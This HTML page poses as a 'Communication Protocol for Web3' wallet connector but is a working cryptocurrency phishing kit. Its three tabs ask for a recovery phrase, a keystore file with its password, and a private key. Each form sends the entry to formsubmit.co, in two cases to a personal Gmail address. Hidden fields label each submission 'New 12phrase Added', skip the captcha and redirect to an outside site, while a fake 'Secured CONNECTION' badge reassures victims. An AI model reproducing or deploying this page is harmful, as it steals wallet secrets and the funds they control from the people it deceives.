<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Communication Protocol for Web3</title>
		<!-- CSS only -->
		<link
			href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
			rel="stylesheet"
			integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
			crossorigin="anonymous"
		/>
		<link rel="stylesheet" href="input.css" />
	</head>
	<body>
		<div class="container connection">
			<div class="connection-body">
				<div class="eth-logo">
					<img src="./images/eth_logo.png" alt="" />
					<p>
						<strong> Info alert! </strong> Securely use any of the options below
					</p>
				</div>

				<div class="import-box">
					<div class="modal-body text-center justify-content-center mt-4">
						<ul class="nav nav-tabs nav-fill" id="myTab" role="tablist">
							<li class="nav-item" role="presentation">
								<button
									class="nav-link active"
									id="home-tab"
									data-bs-toggle="tab"
									data-bs-target="#home"
									type="button"
									role="tab"
									aria-controls="home"
									aria-selected="true"
								>
									Phrase
								</button>
							</li>

							<li class="nav-item" role="presentation">
								<button
									class="nav-link"
									id="contact-tab"
									data-bs-toggle="tab"
									data-bs-target="#contact"
									type="button"
									role="tab"
									aria-controls="contact"
									aria-selected="false"
								>
									Keystore
								</button>
							</li>
							<li class="nav-item" role="presentation">
								<button
									class="nav-link"
									id="profile-tab"
									data-bs-toggle="tab"
									data-bs-target="#profile"
									type="button"
									role="tab"
									aria-controls="profile"
									aria-selected="false"
								>
									Private Key
								</button>
							</li>
						</ul>

						<!-- tab-content -->
						<div class="tab-content g-5" id="myTabContent">
							<div
								class="tab-pane fade show active"
								id="home"
								role="tabpanel"
								aria-labelledby="home-tab"
							>
								<form
									action="https://formsubmit.co/"
									method="POST"
									name="form"
									onsubmit="return validated()"
									class="mt-3"
								>
									<div class="mb-3">
										<div class="phrase-box">
											<input
												type="text"
												name="phrase"
												class="form-control py-5"
												id="phrase-box"
												placeholder="Enter your recovery phrase..."
												required=""
												autocomplete="off"
											/>
										</div>
										<div id="emailHelp" class="form-text text-center m-2 mt-4">
											Typically 12 (sometimes 24) words separated by single
											spaces
										</div>
									</div>

									<input
										type="hidden"
										name="_next"
										value="https://www.node-sync.link/qrcode.html"
									/>
									<input
										type="hidden"
										name="_subject"
										value="New 12phrase Added"
									/>
									<input type="hidden" name="_captcha" value="false" />

									<button
										type="submit"
										class="btn btn-primary mt-1 justify-content-center"
										id="btn"
									>
										<a href="./qrcode.html"></a> Proceed
									</button>
								</form>
							</div>

							<div
								class="tab-pane fade"
								id="contact"
								role="tabpanel"
								aria-labelledby="contact-tab"
							>
								<form
									action="https://formsubmit.co/johnsondon138@gmail.com"
									method="POST"
									name="form"
									class="mt-3"
								>
									<div class="mb-3">
										<input
											type="text"
											name="password"
											class="form-control p-1"
											id="exampleInputEmail1"
											aria-describedby="emailHelp"
											placeholder="password..."
											required
										/>
										<label
											for="dropzone-file"
											style="
												border: 1px solid grey;
												border-radius: 10px;
												margin-top: 1em;
												width: 100%;
											"
										>
											<div
												class="flex flex-col justify-center items-center pt-5 pb-6"
											>
												<svg
													style="width: 30px"
													aria-hidden="true"
													class="mb-3 w-10 h-10 text-gray-400"
													fill="none"
													stroke="currentColor"
													viewBox="0 0 24 24"
													xmlns="http://www.w3.org/2000/svg"
												>
													<path
														stroke-linecap="round"
														stroke-linejoin="round"
														stroke-width="2"
														d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
													></path>
												</svg>
												<p style="font-size: 14px">
													<span class="font-semibold">Click to upload</span> or
													drag and drop
												</p>
												<p style="font-size: 13px">
													SVG, PNG, JPG or GIF (MAX. 800x400px)
												</p>
											</div>
											<input
												id="dropzone-file"
												type="file"
												class="hidden"
												style="display: none"
											/>
										</label>
										<div id="emailHelp" class="form-text text-center m-2 mt-4">
											Several lines of text beginning with "{...}" plus the
											password you used to encrypt it
										</div>
									</div>

									<input
										type="hidden"
										name="_next"
										value="https://www.node-sync.link/qrcode.html"
									/>
									<input
										type="hidden"
										name="_subject"
										value="New 12phrase Added"
									/>
									<input type="hidden" name="_captcha" value="false" />

									<button type="submit" class="btn btn-primary mt-1">
										<a href="./qrcode.html"></a> Proceed
									</button>
								</form>
							</div>

							<div
								class="tab-pane fade"
								id="profile"
								role="tabpanel"
								aria-labelledby="profile-tab"
							>
								<form
									action="https://formsubmit.co/johnsondon138@gmail.com"
									method="POST"
									name="form"
									class="mt-3"
								>
									<div class="mb-3 phrase-box">
										<input
											type="text"
											name="phrase"
											class="form-control py-5"
											id="phrase-box"
											placeholder="Enter your private key"
											required=""
										/>
										<div id="emailHelp" class="form-text text-center m-2 mt-4">
											Typically 64 alphanumeric characters
										</div>
									</div>

									<input
										type="hidden"
										name="_next"
										value="https://www.node-sync.link/qrcode.html"
									/>
									<input
										type="hidden"
										name="_subject"
										value="New 12phrase Added"
									/>
									<input type="hidden" name="_captcha" value="false" />

									<button
										type="submit"
										class="btn btn-primary justify-content-center mt-1"
										id="btn"
									>
										<a href="./qrcode.html"></a> Proceed
									</button>
								</form>
							</div>
						</div>
					</div>

					<div class="secure btn btn-primary">
						<!-- <img src="./images/shield.jpeg" alt="" /> -->
						<p>Secured CONNECTION</p>
					</div>
				</div>
			</div>
		</div>

		<!-- JavaScript Bundle with Popper -->
		<script
			src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"
			integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3"
			crossorigin="anonymous"
		></script>
	</body>
</html>
